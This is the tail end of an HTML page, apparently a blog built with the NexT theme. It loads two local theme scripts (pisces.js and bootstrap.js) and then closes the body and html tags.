  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
